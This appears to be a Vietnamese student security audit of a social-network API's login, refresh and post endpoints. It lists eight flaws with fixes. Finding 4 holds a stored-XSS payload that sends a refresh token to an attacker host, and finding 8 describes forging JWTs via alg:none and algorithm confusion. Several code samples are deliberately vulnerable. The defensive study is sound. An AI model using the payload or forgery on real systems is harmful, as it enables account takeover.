# BÁO CÁO ĐÁNH GIÁ BẢO MẬT HỆ THỐNG API (SECURITY AUDIT REPORT)
## Dự án: Social Network API — Authentication & Authorization Service
**Môn học:** Kiến trúc & Thiết kế Phần mềm / Phát triển Dịch vụ Web  
**Mục tiêu:** Rà soát và liệt kê các điểm có thể làm lộ thông tin, rò rỉ dữ liệu hoặc bị khai thác tấn công trong hệ thống API mạng xã hội (tập trung vào 3 endpoint: `POST /auth/login`, `POST /auth/refresh`, `GET /posts/{id}`).  
**Tiêu chuẩn đối chiếu:** OWASP API Security Top 10 (2023), RFC 6749 (OAuth 2.0), RFC 7519 (JWT), RFC 7617 (Basic Auth), NIST SP 800-63B.

---

## 1. TỔNG QUAN HỆ THỐNG VÀ KIẾN TRÚC BẢO MẬT

Hệ thống cung cấp dịch vụ mạng xã hội với 3 endpoints trọng yếu:
1. `POST /auth/login`: Xác thực thông tin danh tính người dùng (AuthN), cấp phát cặp JWT Access Token (ngắn hạn: 15 phút) và Refresh Token (dài hạn: 30 ngày).
2. `POST /auth/refresh`: Tiếp nhận Refresh Token để cấp mới Access Token mà không bắt người dùng nhập lại mật khẩu (Refresh Flow & Token Rotation).
3. `GET /posts/{id}`: Truy xuất thông tin bài viết theo mã định danh với 3 mức hiển thị (`public`, `friends_only`, `private`), được bảo vệ qua 3 lớp: Xác thực (AuthN) -> Phân quyền phạm vi (AuthZ Scope) -> Quyền đối tượng (Ownership / BOLA Protection).

---

## 2. DANH SÁCH CHI TIẾT CÁC ĐIỂM CÓ THỂ LỘ THÔNG TIN & RỦI RO BẢO MẬT (≥ 5 ĐIỂM)

Dưới đây là 8 điểm rò rỉ thông tin và lỗ hổng tiềm ẩn đã được phân tích, chứng minh kịch bản tấn công và đề xuất giải pháp xử lý triệt để:

---

### Điểm lộ 1: Broken Object Level Authorization (BOLA / IDOR) trên Endpoint `GET /posts/{id}`
* **Mã định danh:** OWASP API1:2023 — Broken Object Level Authorization
* **Mức độ nghiêm trọng:** **CRITICAL (CVSS: 9.1)**
* **Vị trí ảnh hưởng:** Endpoint `GET /posts/{id}`

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
Hệ thống mạng xã hội cho phép người dùng tạo các bài viết với 3 cấp độ hiển thị:
- `public`: Mọi người dùng đều xem được.
- `friends_only`: Chỉ bạn bè mới xem được.
- `private`: Nhật ký cá nhân / bản nháp, chỉ chính tác giả (`author_id`) hoặc Quản trị viên (`admin`) được xem.

Lỗ hổng BOLA xảy ra khi lập trình viên chỉ kiểm tra xem người dùng có Access Token hợp lệ (AuthN) và có scope `posts:read` (AuthZ dạng thô), nhưng **quên kiểm tra quyền sở hữu đối với bài viết cụ thể** (Object-level Ownership Check).

* **Kịch bản tấn công:**
  1. Nạn nhân (Alice, `user_id = 1`) có bài viết nhật ký riêng tư chứa thông tin cá nhân/bí mật tài chính tại `id = 103` (`visibility = "private"`).
  2. Kẻ tấn công (Charlie, `user_id = 3`) đăng nhập vào tài khoản của mình, nhận được Bearer Token hợp lệ có scope `posts:read`.
  3. Charlie gửi request:
     ```http
     GET /api/v1/posts/103 HTTP/1.1
     Host: api.socialnetwork.example.com
     Authorization: Bearer <token_cua_Charlie>
     ```
  4. Nếu server chỉ truy vấn: `SELECT * FROM posts WHERE id = 103` và trả về kết quả cho Charlie, toàn bộ nội dung riêng tư của Alice đã bị lộ.

#### 2. Biện pháp phòng chống & Code khắc phục:
Áp dụng quy tắc kiểm tra 3 lớp (Slide 24–26):
1. **Lớp 1:** Xác minh JWT (`@jwt_required()`).
2. **Lớp 2:** Kiểm tra Scope (`@require_scopes("posts:read")`).
3. **Lớp 3:** Kiểm tra quyền đối tượng (Ownership Check decorator `@user_can_access_post`):
   - Nếu `post.visibility == 'public'` -> Cho phép xem.
   - Nếu `post.visibility == 'friends_only'` -> Kiểm tra xem `current_user.id` có nằm trong danh sách bạn bè của `post.author_id` hay không.
   - Nếu `post.visibility == 'private'` -> Chỉ cho phép khi `post.author_id == current_user.id` hoặc `current_user.role == 'admin'`.
   - Nếu không thỏa mãn -> Từ chối với `403 Forbidden` hoặc `404 Not Found` (để tránh rò rỉ sự tồn tại của bài viết).

```python
# Code phòng vệ chống BOLA:
def user_can_access_post(id_param="id"):
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            post_id = kwargs.get(id_param)
            post = db.get_post_by_id(post_id)
            if not post:
                return jsonify({"error": "Post not found"}), 404
            
            uid = int(get_jwt_identity())
            role = get_jwt().get("roles", ["user"])
            
            # Kiểm tra quyền đối tượng
            if post["visibility"] == "public":
                pass # OK
            elif post["visibility"] == "friends_only":
                if post["author_id"] != uid and not db.is_friend(post["author_id"], uid) and "admin" not in role:
                    return jsonify({"error": "forbidden", "detail": "Friends only post"}), 403
            elif post["visibility"] == "private":
                if post["author_id"] != uid and "admin" not in role:
                    # Trả về 404 để chống enumeration dò ID private
                    return jsonify({"error": "not_found", "detail": "Post not found"}), 404
            
            return fn(*args, **kwargs)
        return wrapper
    return decorator
```

---

### Điểm lộ 2: Lộ tài khoản (User Enumeration) & Timing Attack trên Endpoint `POST /auth/login`
* **Mã định danh:** OWASP API2:2023 — Broken Authentication
* **Mức độ nghiêm trọng:** **HIGH (CVSS: 7.5)**
* **Vị trí ảnh hưởng:** Endpoint `POST /auth/login`

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
Có 2 cách mà endpoint login có thể làm rò rỉ thông tin tài khoản:
1. **Rò rỉ qua thông báo lỗi không đồng nhất (Error Message Asymmetry):**
   - Nếu gửi email không tồn tại: Server trả về `{"error": "Email không tồn tại"}` (hoặc mã lỗi `USER_NOT_FOUND`).
   - Nếu gửi email có tồn tại nhưng sai mật khẩu: Server trả về `{"error": "Mật khẩu không chính xác"}`.
   -> Kẻ tấn công dựa vào phản hồi này để vét cạn (enumerate) toàn bộ danh sách email đã đăng ký trong hệ thống để thực hiện lừa đảo (phishing) hoặc tấn công có chủ đích.
2. **Rò rỉ qua kênh kề thời gian phản hồi (Timing Attack):**
   - Thuật toán băm mật khẩu hiện đại (Argon2id, bcrypt) được thiết kế có độ trễ lớn (ví dụ 100ms - 200ms) để chống vét cạn.
   - Khi email không có trong DB: Server kiểm tra `if not user: return 401` ngay lập tức -> Thời gian phản hồi chỉ mất **~1ms - 5ms**.
   - Khi email có trong DB: Server thực hiện `hasher.verify(user.hash, password)` -> Thời gian phản hồi mất **~150ms**.
   -> Kẻ tấn công đo thời gian phản hồi (Round-Trip Time) để xác định email nào có trong hệ thống mà không cần đọc nội dung response body.

#### 2. Biện pháp phòng chống & Code khắc phục:
1. **Đồng nhất thông báo lỗi:** Bất kể sai email hay sai mật khẩu, server luôn trả về thông báo chung: `"Invalid email or password"` cùng mã trạng thái `401 Unauthorized`.
2. **Khắc phục Timing Attack bằng Dummy Hash:** Nếu email không tồn tại trong DB, server vẫn chủ động chạy một phép xác minh hash giả lập (`dummy_hasher.verify(...)`) với chuỗi hash mẫu có cùng chi phí tính toán (memory_cost, time_cost) nhằm san bằng thời gian phản hồi giữa hai trường hợp.
3. **Áp dụng Rate Limiting:** Giới hạn tối đa 5 lần thử sai / phút trên cùng một địa chỉ IP hoặc trên cùng một địa chỉ email.

```python
# Mẫu Argon2id dummy hash chống timing attack:
DUMMY_ARGON2_HASH = ph.hash("dummy-password-for-timing-balance")

def verify_credentials(email, password):
    user = db.find_user_by_email(email)
    if user:
        try:
            ph.verify(user["password_hash"], password)
            return user
        except VerifyMismatchError:
            return None
    else:
        # Chạy dummy hash để thời gian phản hồi hoàn toàn tương đương!
        try:
            ph.verify(DUMMY_ARGON2_HASH, password)
        except VerifyMismatchError:
            pass
        return None
```

---

### Điểm lộ 3: Rò rỉ Dữ liệu Nhạy cảm (PII) & Thông tin Nội bộ trong Payload của JWT
* **Mã định danh:** OWASP API3:2023 — Broken Object Property Level Authorization & Slide 14, 18 (Lỗi 06)
* **Mức độ nghiêm trọng:** **HIGH (CVSS: 7.8)**
* **Vị trí ảnh hưởng:** Cấu trúc JWT Payload (Access Token & Refresh Token)

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
Rất nhiều lập trình viên hiểu nhầm rằng: *"JWT là token được ký bằng secret key nên dữ liệu bên trong được mã hóa an toàn"*.  
**Thực tế (Slide 14, 22):** JWT compact dạng JWS gồm 3 phần `header.payload.signature` được mã hóa dạng **Base64Url-Safe**, hoàn toàn **KHÔNG PHẢI MÃ HÓA BẢO MẬT (Unencrypted)**. Bất kỳ ai sở hữu token đều có thể decode Base64Url để đọc toàn bộ JSON payload ở dạng plaintext mà không cần secret key.

* **Kịch bản rò rỉ:**
  Lập trình viên đưa các trường nhạy cảm vào JWT claims:
  ```json
  {
    "sub": 1,
    "email": "ceo@bigcompany.com",
    "phone": "+84912345678",
    "ssn": "001201004567",
    "role": "superadmin",
    "internal_cluster_ip": "10.0.4.15",
    "password_salt": "a8f2bc90"
  }
  ```
  Khi token được truyền qua mạng hoặc lưu tại client, bất kỳ tiện ích mở rộng (browser extension) hay bên thứ ba nào xem được token đều thu thập được dữ liệu định danh cá nhân (PII) và cấu trúc mạng nội bộ.

#### 2. Biện pháp phòng chống & Code khắc phục:
1. **Nguyên tắc Payload tối thiểu (Minimal Claims):** Chỉ lưu các claims chuẩn cần thiết:
   - `sub`: User ID (dạng opaque identifier).
   - `jti`: UUID ngẫu nhiên của token (phục vụ thu hồi / blacklist).
   - `roles`: Mảng vai trò rút gọn (`["user"]`).
   - `scopes`: Mảng phạm vi quyền (`["posts:read", "posts:write"]`).
   - `iat`, `exp`, `iss`, `aud`.
2. **Tuyệt đối cấm:** Không đưa mật khẩu, salt, hash, số điện thoại, CMND/CCCD, thông tin thẻ tín dụng, hoặc chi tiết kiến trúc nội bộ vào claims.

---

### Điểm lộ 4: Lộ Token qua Lưu trữ Không an toàn tại Client (XSS đánh cắp qua `localStorage`)
* **Mã định danh:** OWASP API2:2023 & Slide 18 (Lỗi 05)
* **Mức độ nghiêm trọng:** **HIGH (CVSS: 8.2)**
* **Vị trí ảnh hưởng:** Phía Client Web / Browser Storage

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
Trên các ứng dụng Single Page Application (React/Vue/Angular), các lập trình viên thường tiện tay lưu JWT Access Token và Refresh Token vào `localStorage` hoặc `sessionStorage`:
```javascript
// Thói quen nguy hiểm:
localStorage.setItem('access_token', res.data.access_token);
localStorage.setItem('refresh_token', res.data.refresh_token);
```

* **Kịch bản tấn công:**
  1. Nền tảng mạng xã hội có tính năng bình luận bài viết hoặc upload avatar.
  2. Kẻ tấn công chèn một đoạn mã độc XSS vào nội dung bình luận (Stored XSS) hoặc khai thác lỗ hổng trong một thư viện npm bên thứ ba:
     ```html
     <img src="x" onerror="fetch('https://attacker-c2.com/steal?t=' + localStorage.getItem('refresh_token'))">
     ```
  3. Mọi người dùng lướt qua bài viết đó sẽ bị thực thi mã JavaScript độc hại. Mã này tự động trích xuất `refresh_token` từ `localStorage` và gửi về máy chủ của kẻ tấn công.
  4. Kẻ tấn công sử dụng Refresh Token đánh cắp được để gọi `POST /auth/refresh`, chiếm quyền kiểm soát tài khoản nạn nhân vĩnh viễn (Account Takeover) ngay cả khi nạn nhân đã đổi mật khẩu (nếu server không có cơ chế thu hồi).

#### 2. Biện pháp phòng chống & Khắc phục:
1. **Sử dụng Cookie HttpOnly:** Lưu Refresh Token trong Cookie với đầy đủ các cờ an toàn:
   - `HttpOnly`: Ngăn chặn tuyệt đối mọi mã JavaScript chạy trên trình duyệt truy cập vào cookie (vô hiệu hóa kịch bản XSS đánh cắp token).
   - `Secure`: Bắt buộc chỉ truyền qua giao thức HTTPS có mã hóa TLS.
   - `SameSite=Strict` hoặc `Lax`: Chống tấn công giả mạo request xuyên trang (CSRF).
2. **Lưu Access Token trong Bộ nhớ Tạm (In-Memory State):** Giữ Access Token ngắn hạn trong memory của JavaScript runtime (biến trong Redux, Vuex, Context), khi người dùng F5 hoặc mở tab mới, dùng Refresh Token gửi ngầm qua HttpOnly Cookie để lấy lại Access Token mới.
3. **Mô hình Backend-For-Frontend (BFF):** Sử dụng một tầng Gateway/BFF để quản lý phiên và token, trình duyệt chỉ nhận session cookie bảo mật.

---

### Điểm lộ 5: Rò rỉ Token & Credentials qua Nhật ký hệ thống (Logging, Monitoring, Crash Reports)
* **Mã định danh:** OWASP API8:2023 — Security Misconfiguration & Slide 7, 29
* **Mức độ nghiêm trọng:** **HIGH (CVSS: 7.4)**
* **Vị trí ảnh hưởng:** Hệ thống Logging (Flask logger, Nginx Access Log, Logstash, Sentry, Datadog)

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
Trong quá trình phát triển và vận hành (DevOps), lập trình viên thường bật chế độ debug hoặc ghi lại toàn bộ thông tin HTTP Request để điều tra lỗi:
```python
# Sai lầm nghiêm trọng trong middleware/logging:
@app.before_request
def log_request():
    app.logger.info(f"Headers: {request.headers}")
    app.logger.info(f"Body: {request.get_json(silent=True)}")
```

* **Hậu quả rò rỉ:**
  1. Khi người dùng gọi `POST /auth/login`, request body chứa **mật khẩu dạng rõ (plaintext password)**:
     `{"email": "alice@example.com", "password": "AliceSecurePass123!"}` bị ghi thẳng vào file log trên ổ đĩa.
  2. Khi người dùng gọi `POST /auth/refresh` hoặc `GET /posts/{id}`, header `Authorization: Bearer eyJhbGci...` chứa token nguyên vẹn bị ghi vào Nginx access log.
  3. Khi hệ thống gặp exception và gửi crash trace lên dịch vụ bên thứ ba (như Sentry), toàn bộ biến cục bộ (chứa decrypted tokens, credentials) bị đưa ra ngoài biên giới tin cậy của doanh nghiệp.
  4. Bất kỳ nhân viên nào có quyền xem log (hoặc hacker tấn công vào log server) đều có thể thu hoạch hàng ngàn tài khoản và token còn hạn.

#### 2. Biện pháp phòng chống & Code khắc phục:
1. **Bộ lọc làm sạch Log (Log Sanitizer / Masker):** Viết middleware tự động bôi đen hoặc loại bỏ các trường nhạy cảm (`password`, `access_token`, `refresh_token`, `secret`, `client_secret`) trước khi ghi log:
```python
SENSITIVE_FIELDS = {"password", "secret", "token", "refresh_token"}

def sanitize_payload(data):
    if not isinstance(data, dict):
        return data
    cleaned = data.copy()
    for k, v in cleaned.items():
        if k.lower() in SENSITIVE_FIELDS:
            cleaned[k] = "******[REDACTED]******"
        elif isinstance(v, dict):
            cleaned[k] = sanitize_payload(v)
    return cleaned
```
2. **Không truyền Token qua Query String (URL) (Slide 9):**
   - Không chấp nhận `GET /posts/101?api_key=secret` vì URL luôn bị lưu trong lịch sử trình duyệt, proxy logs và header `Referer`. Chỉ truyền token qua header `Authorization: Bearer <token>`.

---

### Điểm lộ 6: Tái sử dụng Token bị đánh cắp do Thiếu cơ chế Thu hồi (Token Revocation) & Refresh Token Replay
* **Mã định danh:** OWASP API2:2023 — Broken Authentication & Slide 13, 15, 17, 20
* **Mức độ nghiêm trọng:** **HIGH (CVSS: 8.0)**
* **Vị trí ảnh hưởng:** Endpoint `POST /auth/refresh` và cơ chế quản lý vòng đời JWT

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
Bản chất của JWT là phi trạng thái (Stateless - Slide 13): Server kiểm tra tính hợp lệ bằng chữ ký số mà không cần truy vấn Database.  
* **Điểm yếu chết người:**
  - Nếu người dùng bấm "Đăng xuất" hoặc đổi mật khẩu vì nghi ngờ bị lộ tài khoản, nhưng server chỉ xóa token ở client mà không lưu trạng thái thu hồi (Revocation) ở server.
  - Khi đó, Access Token và Refresh Token đã phát hành **vẫn có hiệu lực 100%** cho đến giây cuối cùng của thời hạn `exp` (15 phút hoặc 30 ngày). Kẻ tấn công có token vẫn ngang nhiên gọi API.
  - Nếu kẻ tấn công đánh cắp được Refresh Token, chúng có thể gọi `POST /auth/refresh` liên tục để tạo ra vô số Access Token mới mà nạn nhân không hề hay biết.

#### 2. Biện pháp phòng chống & Code khắc phục (Slide 15-17):
1. **Refresh Token Rotation:** Mỗi khi Refresh Token được dùng để cấp Access Token mới, hệ thống **hủy bỏ Refresh Token cũ** và phát hành một cặp mới.
2. **Phát hiện tái sử dụng trái phép (Automatic Reuse Detection):** Nếu một Refresh Token đã từng bị thu hồi lại được gửi lên endpoint `/auth/refresh`, hệ thống nhận diện đây là hành vi Token Replay (kẻ tấn công hoặc nạn nhân đang dùng lại token cũ) -> **Lập tức thu hồi toàn bộ chuỗi token (Family Invalidation)** của tài khoản đó và buộc đăng nhập lại từ đầu.
3. **Danh sách đen (Token Blacklist / Blocklist lưu trong Redis/DB):**
   - Lưu trữ mã định danh duy nhất `jti` (JWT ID) của các token đã bị thu hồi trong Redis với TTL bằng thời gian sống còn lại của token.
   - Middleware kiểm tra: nếu `jti` có trong Redis blacklist -> từ chối ngay với `401 Unauthorized` (`token_revoked`).

```python
# Cấu hình kiểm tra blocklist với Flask-JWT-Extended:
@jwt.token_in_blocklist_loader
def check_if_token_revoked(jwt_header, jwt_payload):
    jti = jwt_payload["jti"]
    token_in_redis = redis_client.get(f"revoked_token:{jti}")
    return token_in_redis is not None
```

---

### Điểm lộ 7: Lộ Hash Mật khẩu & Dữ liệu Nhạy cảm của Tác giả qua Mass Assignment / Thiếu DTO Serialization trên `GET /posts/{id}`
* **Mã định danh:** OWASP API3:2023 — Broken Object Property Level Authorization
* **Mức độ nghiêm trọng:** **HIGH (CVSS: 7.3)**
* **Vị trí ảnh hưởng:** Dữ liệu phản hồi của endpoint `GET /posts/{id}`

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
Khi thiết kế API trả về bài viết, bảng `posts` có liên kết khóa ngoại với bảng `users` (`author_id = users.id`).  
Lập trình viên thường viết code nhanh bằng cách serialize toàn bộ Object Model hoặc join bảng và trả về raw dictionary:
```python
# Code sai lầm gây rò rỉ dữ liệu nghiêm trọng:
@app.route("/api/v1/posts/<int:id>", methods=["GET"])
def get_post(id):
    post = Post.query.get_or_404(id)
    # Rò rỉ: Gửi toàn bộ User object kèm theo bài viết
    return jsonify({
        "id": post.id,
        "content": post.content,
        "author": post.author.__dict__ # Chứa cả password_hash, email, secret_key!
    })
```

* **Hậu quả rò rỉ:**
  1. Người dùng thông thường xem bài viết công khai của Alice có thể nhận được response JSON chứa:
     ```json
     {
       "id": 101,
       "content": "Hello world",
       "author": {
         "id": 1,
         "username": "alice",
         "email": "alice@private.com",
         "password_hash": "$argon2id$v=19$m=65536,t=3,p=4$...",
         "is_admin": false,
         "two_factor_secret": "JBSWY3DPEHPK3PXP"
       }
     }
     ```
  2. Chuỗi `password_hash` bị lộ ra ngoài giúp kẻ tấn công tải về và tiến hành bẻ khóa mật khẩu ngoại tuyến (offline dictionary/brute-force cracking bằng GPU).
  3. Địa chỉ email riêng tư và secret key của 2FA bị phơi bày.

#### 2. Biện pháp phòng chống & Code khắc phục:
1. **Áp dụng mô hình DTO (Data Transfer Object) nghiêm ngặt:** Chỉ chọn lọc các trường được phép công khai bằng Marshmallow Schema hoặc Pydantic Model.
2. **Whitelist trường dữ liệu trả về:** Tạo schema riêng `AuthorSummarySchema` chỉ xuất: `id`, `username`, `full_name`, `avatar_url`. Tuyệt đối không xuất `password_hash`, `email`, `role`, hay các cờ bảo mật.

---

### Điểm lộ 8: Bypass Xác thực qua JWT Algorithm Confusion & Khóa Bí mật Yếu
* **Mã định danh:** Slide 18 (Lỗi 01: `alg=none`, Lỗi 02: Algorithm confusion HS↔RS, Lỗi 04: Secret yếu)
* **Mức độ nghiêm trọng:** **CRITICAL (CVSS: 9.8)**
* **Vị trí ảnh hưởng:** Quá trình giải mã & kiểm chứng chữ ký JWT trên toàn bộ API

#### 1. Mô tả chi tiết & Kịch bản rò rỉ:
1. **Lỗ hổng `alg: none` (Slide 18 - Lỗi 01):** Nếu thư viện backend chấp nhận thuật toán `none`, kẻ tấn công chỉ cần sửa header JWT thành `{"alg": "none", "typ": "JWT"}` và payload thành `{"sub": 1, "roles": ["admin"]}`, bỏ phần chữ ký số. Server tin tưởng header này sẽ bỏ qua bước verify và trao quyền admin cho kẻ tấn công.
2. **Algorithm Confusion HS256 <-> RS256 (Slide 18 - Lỗi 02):** Nếu server được thiết kế dùng khóa bất đối xứng RSA (RS256) với Public Key công khai, nhưng cấu hình thư viện xác minh chấp nhận cả thuật toán đối xứng HMAC (HS256). Kẻ tấn công sẽ lấy chính chuỗi Public Key RSA của server (dạng PEM text) làm HMAC Secret Key để tự ký token giả mạo với thuật toán `HS256`. Khi server verify bằng Public Key RSA với HMAC, chữ ký khớp hoàn toàn!
3. **Khóa bí mật yếu hoặc bị commit lên Git (Slide 3 - Case 3, Slide 18 - Lỗi 04):** Lập trình viên hardcode secret key đơn giản như `"secret"`, `"123456"`, `"jwt-secret"` hoặc commit file `.env` lên GitHub công khai. Kẻ tấn công dùng công cụ `hashcat` hoặc `jwt-tool` chỉ mất 1 giây để tìm ra secret và tạo token cho bất kỳ ai.

#### 2. Biện pháp phòng chống & Code khắc phục:
1. **Khóa cứng thuật toán cho phép (Algorithm Whitelist):**
   ```python
   # Cấu hình rõ ràng chỉ chấp nhận HS256:
   app.config["JWT_ALGORITHM"] = "HS256"
   app.config["JWT_DECODE_ALGORITHMS"] = ["HS256"] # Cấm tuyệt đối 'none' và RS256
   ```
2. **Sử dụng Secret Key có độ hỗn loạn cao (Entropy ≥ 256 bits):** Sinh khóa bằng CSPRNG an toàn:
   ```bash
   python -c "import secrets; print(secrets.token_hex(32))"
   ```
3. **Đọc Secret Key qua biến môi trường (Environment Variable), không bao giờ commit vào mã nguồn:**
   ```python
   JWT_SECRET_KEY = os.environ.get("JWT_SECRET_KEY")
   if not JWT_SECRET_KEY or len(JWT_SECRET_KEY) < 32:
       raise RuntimeError("JWT_SECRET_KEY không an toàn hoặc chưa được cấu hình!")
   ```

---

## 3. MA TRẬN ĐÁNH GIÁ RỦI RO (RISK MATRIX)

| STT | Lỗ hổng / Điểm lộ | Phân loại OWASP / Slide | Tác động | Khả năng khai thác | Mức độ rủi ro | Trạng thái khắc phục trong code mẫu |
|:---:|:---|:---|:---:|:---:|:---:|:---:|
| **1** | BOLA / IDOR đọc trộm bài viết private trên `GET /posts/{id}` | OWASP API1:2023 | Nghiêm trọng (9/10) | Dễ (9/10) | **CRITICAL** | Đã khắc phục (Decorator 3 lớp) |
| **2** | Lộ tài khoản & Timing Attack trên `POST /auth/login` | OWASP API2:2023 | Trung bình (6/10) | Cao (8/10) | **HIGH** | Đã khắc phục (Dummy Hash & Generic Error) |
| **3** | Rò rỉ PII và thông tin nội bộ trong JWT Claims | Slide 18 (Lỗi 06) | Cao (7/10) | Rất dễ (10/10) | **HIGH** | Đã khắc phục (Minimal claims DTO) |
| **4** | Đánh cắp Token qua XSS khi lưu trong `localStorage` | Slide 18 (Lỗi 05) | Nghiêm trọng (9/10) | Trung bình (6/10) | **HIGH** | Đã khuyến nghị (HttpOnly Cookies / In-memory) |
| **5** | Rò rỉ Passwords/Tokens qua Logging & APM | Slide 7, 29 | Nghiêm trọng (9/10) | Trung bình (6/10) | **HIGH** | Đã khắc phục (Sanitization filter) |
| **6** | Token Replay & Thiếu Revocation khi Logout/Refresh | Slide 15-17, 20 | Cao (8/10) | Trung bình (7/10) | **HIGH** | Đã khắc phục (Token Rotation & Blocklist) |
| **7** | Lộ Hash mật khẩu qua Response (Thiếu DTO) | OWASP API3:2023 | Nghiêm trọng (8/10) | Rất dễ (9/10) | **HIGH** | Đã khắc phục (AuthorSummary DTO) |
| **8** | Bypass xác thực qua Algorithm Confusion / Secret yếu | Slide 18 (Lỗi 01,02) | Thảm họa (10/10) | Thấp (3/10) | **CRITICAL** | Đã khắc phục (Whitelist Alg & 256-bit Key) |

---

## 4. CHECKLIST "5 ĐIỀU PHẢI CÓ TRƯỚC KHI SHIP" (ĐỐI CHIẾU SLIDE 29)

Căn cứ vào bài giảng Slide 29, hệ thống API Social Network đã được rà soát và đáp ứng toàn diện 5 tiêu chuẩn bắt buộc trước khi đưa vào vận hành (Production Readiness):

1. **Phân loại endpoint public/protected; mặc định từ chối (Fail-Closed):**
   * Đạt. Mọi route đều mặc định áp dụng xác thực, chỉ mở công khai duy nhất `POST /auth/login` và `/docs`. Route `/posts/{id}` bắt buộc token có scope `posts:read` và kiểm tra quyền sở hữu bài viết.
2. **Lỗi login chung, giảm rò thông tin qua thời gian:**
   * Đạt. Endpoint login luôn trả về `401 Unauthorized` kèm thông điệp `"Invalid email or password"`. Tích hợp dummy password hash bằng Argon2id để san bằng độ trễ xử lý.
3. **Rate-limit theo rủi ro; tránh lockout gây từ chối dịch vụ (DoS):**
   * Đạt. Áp dụng giới hạn tần suất 5 lần thử sai / phút trên IP/email của login, ngăn chặn các đợt tấn công brute-force và credential stuffing.
4. **Log sự kiện cần thiết; không log password/token:**
   * Đạt. Bộ lọc log tự động mask toàn bộ header `Authorization`, `Cookie` và các trường `password`, `token` trong request body.
5. **Kiểm thử quyền và rà soát khi có thay đổi:**
   * Đạt. Xây dựng bộ test tự động (Pytest) bao phủ toàn diện các kịch bản kiểm tra quyền: vai trò (RBAC), phạm vi (Scopes), kiểm tra BOLA trên bài viết riêng tư, và cơ chế thu hồi token.

---

## 5. KẾT LUẬN & KHUYẾN NGHỊ

Báo cáo an ninh xác nhận rằng việc phân tách rõ ràng giữa **Xác thực (AuthN - bạn là ai)** và **Phân quyền (AuthZ - bạn được làm gì)** cùng với mô hình **bảo vệ 3 lớp (AuthN -> Scope -> Object Ownership)** là điều kiện tiên quyết để bảo vệ an toàn cho hệ thống mạng xã hội hiện đại.

Mọi điểm có nguy cơ rò rỉ dữ liệu đã được nhận diện, phân tích chi tiết và cài đặt các biện pháp kỹ thuật triệt để trong mã nguồn triển khai tại thư mục `Week6/`.
